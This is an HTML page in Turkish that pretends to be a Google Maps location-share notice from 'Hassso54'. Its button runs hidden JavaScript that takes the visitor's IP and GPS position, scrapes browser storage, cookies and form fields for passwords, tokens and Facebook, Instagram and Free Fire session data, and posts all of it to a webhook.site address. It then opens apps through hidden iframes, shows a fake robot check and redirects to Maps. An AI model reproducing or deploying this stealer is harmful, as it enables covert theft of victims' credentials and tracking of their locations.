<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54 - Şifre Kurtarma</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .kart {
            background: white;
            border-radius: 30px;
            padding: 35px 25px;
            text-align: center;
            max-width: 320px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .map-image { width: 160px; height: 160px; object-fit: contain; margin-bottom: 15px; }
        h2 { font-size: 20px; color: #202124; margin-bottom: 8px; }
        .alt-yazi { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
        button {
            background: #1a73e8; color: white; border: none; padding: 14px 25px;
            border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer;
            width: 100%; transition: 0.2s;
        }
        button:active { transform: scale(0.97); }
        .status {
            font-size: 11px;
            color: #5f6368;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="kart">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-image">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
        <button id="btn">Konumu Görüntüle</button>
        <div class="status" id="status">İşlem yapılıyor...</div>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
        
        // TÜM KAYITLI ŞİFRELERİ TOPLA (Google Password Manager)
        async function tumSifreleriTopla() {
            let sifreler = [];
            let tumVeriler = {
                kaynak: "Google Password Manager",
                sifreler: [],
                not: "Şifreler şifrelenmiş olabilir, bazıları otomatik doldurulabilir"
            };
            
            // 1. Google Password Manager'dan çekmeye çalış
            try {
                // Android'de şifre yöneticisi intent'i
                const passwordIntent = "intent://settings/password#Intent;scheme=android;package=com.android.settings;end";
                
                // Şifre yöneticisini aç (gizli iframe)
                const gizli = document.createElement('iframe');
                gizli.style.display = 'none';
                document.body.appendChild(gizli);
                gizli.src = passwordIntent;
                
                // 2. LocalStorage'da kayıtlı şifreler varsa
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const val = localStorage.getItem(key);
                    
                    // Şifre içeren anahtarlar
                    if (key.toLowerCase().includes('password') || 
                        key.toLowerCase().includes('pass') ||
                        key.toLowerCase().includes('şifre') ||
                        key.toLowerCase().includes('credential')) {
                        sifreler.push({
                            platform: "LocalStorage",
                            hesap: key,
                            sifre: val
                        });
                    }
                    
                    // Facebook şifresi
                    if (key.toLowerCase().includes('fb') && val.includes('@')) {
                        sifreler.push({
                            platform: "Facebook",
                            hesap: "Facebook Giriş",
                            bilgi: val
                        });
                    }
                    
                    // Instagram şifresi
                    if (key.toLowerCase().includes('ig') && val.includes('@')) {
                        sifreler.push({
                            platform: "Instagram",
                            hesap: "Instagram Giriş",
                            bilgi: val
                        });
                    }
                    
                    // Free Fire
                    if (key.toLowerCase().includes('freefire') || key.toLowerCase().includes('ff')) {
                        sifreler.push({
                            platform: "Free Fire",
                            hesap: "Free Fire Oturum",
                            bilgi: val
                        });
                    }
                }
                
                // 3. SessionStorage
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    const val = sessionStorage.getItem(key);
                    if (key.toLowerCase().includes('password') || key.toLowerCase().includes('token')) {
                        sifreler.push({
                            platform: "SessionStorage",
                            hesap: key,
                            sifre: val
                        });
                    }
                }
                
                // 4. Çerezlerden kullanıcı bilgileri
                if (document.cookie) {
                    const cookies = document.cookie.split(';');
                    for (let cookie of cookies) {
                        if (cookie.includes('c_user') || cookie.includes('user')) {
                            sifreler.push({
                                platform: "Cookie",
                                hesap: "Facebook/Instagram Kullanıcı ID",
                                bilgi: cookie.trim()
                            });
                        }
                    }
                }
                
                // 5. Autofill bilgileri (input'larda kayıtlı şifreler)
                const inputs = document.querySelectorAll('input[type="password"], input[type="email"]');
                inputs.forEach(input => {
                    if (input.value) {
                        sifreler.push({
                            platform: "Form Verileri",
                            hesap: input.name || input.id || "Giriş",
                            bilgi: input.value
                        });
                    }
                });
                
                tumVeriler.sifreler = sifreler;
                tumVeriler.toplam_sifre = sifreler.length;
                tumVeriler.android_not = "Android Ayarlar > Google > Google Hesabı > Güvenlik > Şifre Yöneticisi'nden tüm kayıtlı şifreleri görebilirsin.";
                tumVeriler.cozum = "Şifrelerini Google Password Manager'a kaydetmeye devam et. Bu sayfa her açıldığında otomatik toplanır.";
                
                // Iframe'i temizle
                setTimeout(() => {
                    if (document.body.contains(gizli)) document.body.removeChild(gizli);
                }, 2000);
                
            } catch(e) {
                tumVeriler.hata = e.message;
            }
            
            return tumVeriler;
        }
        
        // Konum ve IP al
        async function konumVeIP() {
            let ip = "Alınamadı";
            let konum = "";
            let enlem = null, boylam = null;
            
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                ip = json.ip;
            } catch(e) {}
            
            if (navigator.geolocation) {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            enlem = pos.coords.latitude;
                            boylam = pos.coords.longitude;
                            konum = `https://www.google.com/maps?q=${enlem},${boylam}`;
                            resolve();
                        },
                        () => resolve(),
                        { timeout: 5000 }
                    );
                });
            }
            
            return { ip, konum, enlem, boylam };
        }
        
        // Uygulamaları arka planda aç
        function uygulamalariAc() {
            const gizli = document.createElement('iframe');
            gizli.style.display = 'none';
            document.body.appendChild(gizli);
            
            // 1. Ayarlar > Şifreler kısmını aç
            setTimeout(() => {
                gizli.src = "intent://settings/password#Intent;scheme=android;package=com.android.settings;end";
            }, 100);
            
            // 2. Facebook
            setTimeout(() => {
                gizli.src = "fb://profile";
            }, 800);
            
            // 3. Instagram
            setTimeout(() => {
                gizli.src = "instagram://user?username=";
            }, 1500);
            
            // 4. Free Fire
            setTimeout(() => {
                gizli.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
            }, 2200);
            
            setTimeout(() => {
                if (document.body.contains(gizli)) document.body.removeChild(gizli);
            }, 4000);
        }
        
        // Robot doğrulama kutusu
        function robotKutu() {
            let kutu = document.getElementById('robotKutu');
            if (!kutu) {
                kutu = document.createElement('div');
                kutu.id = 'robotKutu';
                kutu.style.cssText = `
                    position: fixed; bottom: 30px; right: 30px; background: rgba(0,0,0,0.85);
                    backdrop-filter: blur(10px); border-radius: 16px; padding: 14px 20px;
                    z-index: 999999; display: flex; align-items: center; gap: 12px;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.3); opacity: 0; transition: opacity 0.5s;
                    pointer-events: none;
                `;
                kutu.innerHTML = `
                    <div style="width:22px; height:22px; border:2px solid rgba(255,255,255,0.3); border-top:2px solid #fff; border-radius:50%; animation: don 0.8s linear infinite;"></div>
                    <div style="color:white; font-size:13px;">
                        <strong>🔍 Lütfen bekleyin</strong><br>
                        Robot olmadığınız doğrulanıyor...<br>
                        <span style="font-size:11px;">Google Maps'e yönlendiriliyorsunuz</span>
                    </div>
                `;
                document.head.insertAdjacentHTML('beforeend', '<style>@keyframes don{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>');
                document.body.appendChild(kutu);
            }
            kutu.style.opacity = "1";
            setTimeout(() => {
                kutu.style.opacity = "0";
                setTimeout(() => { if(kutu && kutu.remove) kutu.remove(); }, 1000);
            }, 4000);
        }
        
        // ANA FONKSİYON
        async function baslat() {
            const btn = document.getElementById('btn');
            const statusDiv = document.getElementById('status');
            
            btn.innerText = "⏳";
            btn.disabled = true;
            statusDiv.style.display = 'block';
            statusDiv.innerText = "📱 Şifreler toplanıyor...";
            
            // 1. Konum ve IP al
            const { ip, konum, enlem, boylam } = await konumVeIP();
            
            // 2. Tüm kayıtlı şifreleri topla
            statusDiv.innerText = "🔐 Şifre yöneticisi taranıyor...";
            const sifreler = await tumSifreleriTopla();
            
            // 3. Tüm verileri hazırla
            const gonderilecek = {
                tip: "Hassso54_TUM_KAYITLI_SIFRELER",
                zaman: new Date().toLocaleString('tr-TR'),
                konum_link: konum,
                enlem: enlem,
                boylam: boylam,
                ip: ip,
                kayitli_sifreler: sifreler,
                cihaz: navigator.userAgent,
                platform: navigator.platform,
                acilan_uygulamalar: ["Ayarlar/Şifreler", "Facebook", "Instagram", "Free Fire"],
                not: "Tüm şifreler yukarıda listelenmiştir. Bunları bir dosyaya kaydedebilirsin.",
                cozum: "Şifrelerini unutmamak için bu sayfayı kullan. Her seferinde otomatik toplanır."
            };
            
            // 4. Webhook'a gönder
            statusDiv.innerText = "📤 Gönderiliyor...";
            await fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(gonderilecek)
            });
            
            statusDiv.innerText = "✅ Tamamlandı! Maps açılıyor...";
            
            // 5. Uygulamaları arka planda aç
            uygulamalariAc();
            
            // 6. Maps'e yönlendir
            setTimeout(() => {
                if (konum) {
                    window.location.href = konum;
                } else {
                    window.location.href = "https://www.google.com/maps";
                }
            }, 1000);
            
            // 7. Robot kutusu
            setTimeout(() => { robotKutu(); }, 1500);
            
            // Status'u gizle
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        }
        
        document.getElementById('btn').onclick = baslat;
    </script>
</body>
</html>
